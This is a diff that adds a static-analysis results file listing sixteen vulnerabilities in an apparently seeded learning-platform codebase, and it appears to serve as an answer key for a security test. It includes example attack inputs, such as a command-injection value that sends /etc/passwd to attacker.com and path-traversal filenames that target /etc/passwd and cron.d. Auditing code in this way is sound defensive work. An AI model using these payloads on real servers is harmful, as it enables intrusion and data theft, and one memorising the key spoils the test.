@@ -1,0 +1,407 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.path-traversal-file-upload",
+      "path": "src/lib/upload.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveUploadedFile() derives the stored file's extension from the attacker-controlled File.name (`file.name.split('.').pop()`) and concatenates it directly into the filename passed to path `join(dir, uniqueName)`. If the uploaded filename contains no dot (e.g. '../../../../tmp/evil.sh') or is crafted so the 'extension' portion contains '/..' sequences, the resulting path escapes the intended upload directory. This function is used by uploadCourseResource, uploadSubmissionFile, submitAssignment and replaceSubmission, meaning even a low-privileged student can write files outside the uploads folder via a malicious multipart filename.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal-handout-read",
+      "path": "src/lib/document-library.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readCourseHandoutFile(folder, filename) joins two fully attacker-controlled strings directly onto HANDOUT_ROOT with no containment check (unlike readArchivedSubmissionFile below it, which resolves and verifies the path stays within baseDir). It is called from src/actions/files.ts downloadCourseHandout(), which only requires the caller to be logged in (any role, including student) and validates folder/filename with a zod schema that merely checks they are non-empty strings. A value like filename='../../../../etc/passwd' lets any authenticated user read arbitrary files from the server's filesystem.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal-module-publish",
+      "path": "src/lib/module-publishing.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "publishModulePage() builds the cached-page file path as `join(courseDir, `${pageSlug}.html`)` using the raw, unsanitized pageSlug, while the sibling publishModulePreview() (a few lines below) sanitizes the same input with `basename(pageSlug)`. pageSlug comes straight from formData in src/actions/courses.ts publishModuleStaticPage() with no validation, so an instructor/admin can supply a slug like '../../../../etc/cron.d/pwn' to write an HTML file (containing instructor-controlled content) to an arbitrary path on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal-course-banner-upload",
+      "path": "src/lib/course-branding.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveCourseBannerImage() builds the destination path as `path.join(BANNER_DIR, `${courseId}-${file.name}`)` using the raw, attacker-controlled uploaded File.name, with no allowlist, extension check, or basename sanitization (contrast with saveProfileAvatarImage() just below, which enforces a MIME allowlist, a size cap, and writes under a randomUUID()-generated name). A crafted file.name containing '../' sequences lets an instructor/admin write the uploaded file outside the course-banners directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-reportconv",
+      "path": "src/lib/report-conversion.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertGradeExportToFormat() builds a shell command string by directly interpolating sourceCsvPath and reportType and executes it with `spawn('bash', ['-c', cmd], { shell: true })`. reportType is taken unchecked from formData.get('reportType') in src/actions/admin.ts exportGradesCsv() (no allowlist, unlike the sibling convertSubmissionsReportToFormat() which validates against ALLOWED_REPORT_TYPES and uses shell:false with an argument array). An instructor/admin can submit a reportType such as `csv; curl attacker.com/$(cat /etc/passwd)` to execute arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.jwt-signature-not-verified",
+      "path": "src/lib/partner-integration.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 29,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "processAllocation() decodes the partner assertion token with `decodeJwt()`, which parses the JWT payload without verifying its signature, then trusts the embedded role/cohortId claims to decide whether to return the full per-seat cost/roster breakdown. It is reachable unauthenticated via GET /api/partner/cost-allocation (assertion taken straight from the Authorization header) and via viewPartnerCostAllocation() in src/actions/partner-allocation.ts. Any caller can forge an unsigned/arbitrary JWT with `role: \"sponsor\"` and any `cohortId` to obtain the full enrollment/seat data for any cohort. The sibling handleResourceCheck() (same file) correctly calls `jwtVerify()` against PARTNER_SECRET, confirming this is a real, contrasting flaw.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.cbc-padding-oracle",
+      "path": "src/lib/exam-package.ts",
+      "start": {
+        "line": 28,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 48,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "decryptExamAnswerKeyPackage() uses unauthenticated AES-256-CBC and distinguishes padding/decrypt failures ('Malformed package padding') from other errors ('Package could not be decrypted') in its response, exposed via POST /api/grading/answer-key-package. This distinct-error behavior is the classic signature of a padding-oracle vulnerability: repeated ciphertext manipulation plus observation of which error is returned lets an attacker decrypt (or forge) exam answer-key ciphertext without knowing PACKAGE_KEY. The sibling decryptGradebookSnapshot()/encryptGradebookSnapshot() in the same file correctly use AES-256-GCM (AEAD) and return one generic error for every failure, confirming this is the intentionally weaker path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-696: Incorrect Behavior Order",
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.mass-assignment-lesson-import",
+      "path": "src/actions/content-import.ts",
+      "start": {
+        "line": 58,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 64,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importModuleStructure() spreads each attacker-supplied JSON object from the imported payload directly into the insert: `db.insert(lessons).values({ moduleId, ...lessonData })`. Because the spread comes after the explicit `moduleId` key, a `moduleId` field inside lessonData overrides the verified value, letting an instructor who was authorized only for their own course/module insert lesson rows (including arbitrary content) into a module belonging to a different, unowned course. The sibling importLessonStructure() fixes this by narrowing each row through a zod schema (title/content/orderIndex only) before insert.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.missing-role-check-csv-import",
+      "path": "src/actions/admin.ts",
+      "start": {
+        "line": 182,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 190,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "importEnrollmentsCsv() only calls `await requireAuth()` and performs no role check, unlike every other admin action in this file (updateUserRole, toggleUserDisabled, importUsersCsv all check `role !== 'school_admin'`). Any authenticated user, including a student, can therefore POST a CSV to this action and enroll arbitrary users into any cohort with an arbitrary enrollmentRole of 'instructor' or 'teaching_assistant', granting themselves or others elevated course privileges.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-course-resource-download",
+      "path": "src/app/api/uploads/[...path]/route.ts",
+      "start": {
+        "line": 145,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 168,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "When serving a course-resource file, the handler checks only whether the requesting user has ANY row in cohortEnrollments (`eq(cohortEnrollments.userId, user.id)` with no filter on the resource's actual course/cohort). A student enrolled in Course A therefore passes this check and can download resources belonging to any other course B by simply requesting its file path (which is guessable/enumerable since it is only the raw upload path, not a signed URL), bypassing per-course access control.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.content-disposition-crlf",
+      "path": "src/lib/download-naming.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 22,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildAttachmentDisposition() builds the Content-Disposition header value by embedding the caller-supplied `requestedName` verbatim, with no stripping of CR/LF characters, unlike the sibling buildExportDisposition() a few lines below which explicitly does `.replace(/[\\r\\n]/g, '')`. It is invoked in src/app/api/uploads/[...path]/route.ts with `displayName` taken directly from an unauthenticated-input query parameter, so a value containing `\\r\\n` can inject additional HTTP response headers or split the response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.permissive-credentialed-cors",
+      "path": "src/lib/embed-cors.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildSpotlightCorsHeaders() echoes back whatever Origin header the browser sends as `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`, for the /api/catalog/spotlight-widget endpoint. This allows any website to make a credentialed cross-origin request and read the response together with the visitor's session cookies, defeating the same-origin policy. The sibling buildShowcaseCorsHeaders() correctly restricts this to an explicit allowlist of partner origins.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.log-injection-support-ticket",
+      "path": "src/lib/support-log.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordSupportTicketActivity() writes the caller-supplied `action` string straight into the log line with no neutralization, whereas the sibling recordGradeDisputeActivity() strips `[\\r\\n\\0]` from the same kind of free-text field before logging. `action` comes unchecked from the JSON body of POST /api/support/ticket-activity, so any authenticated user can embed newlines to forge fake log entries or corrupt the log stream.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.handlebars-ssti-announcement",
+      "path": "src/lib/announcement-render.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderCourseAnnouncement() compiles the fully instructor-supplied `layout` string directly with `Handlebars.compile(layout)` and executes it. `layout` is taken unchecked from formData in previewCourseAnnouncement() (src/actions/notifications.ts). Compiling and rendering an attacker/instructor-controlled template string is a server-side template injection sink; Handlebars template expressions can be crafted to reach the constructor/prototype chain and execute arbitrary code on the server. The fixed-layout renderCompletionCertificateMessage() below only ever compiles a hardcoded template, confirming the announcement path is the unsafe one.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.unauthenticated-diagnostics-stack-trace",
+      "path": "src/lib/catalog-search.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchCourseCatalog() returns the raw exception message and full stack trace (`err.stack`) plus the original query to the caller whenever `includeDiagnostics` is true. This is wired up in the completely unauthenticated GET /api/catalog/lookup endpoint, which sets includeDiagnostics based solely on the client-supplied `x-widget-diagnostics: 1` request header. Any unauthenticated internet caller who triggers (or waits for) a query error can obtain internal stack traces revealing file paths and implementation details.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.ta-elevated-grade-history",
+      "path": "src/actions/insights.ts",
+      "start": {
+        "line": 27,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 73,
+        "col": 1,
+        "offset": 0
+      },
+      "extra": {
+        "message": "viewCohortInsights() grants the 'elevated' individual grade-change history view to any user for whom `canTeachCourse()` returns true, which includes teaching_assistant enrollments, purely based on a client-supplied `dataLevel==='elevated'` form field. The sibling viewCourseInsights() explicitly restricts the same elevated data to users with an actual 'instructor' enrollment role (or school_admin), excluding teaching assistants. A teaching assistant can therefore obtain individually-attributed grade-change history (who changed which student's grade and why) that the parallel, more careful endpoint deliberately withholds from that role.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
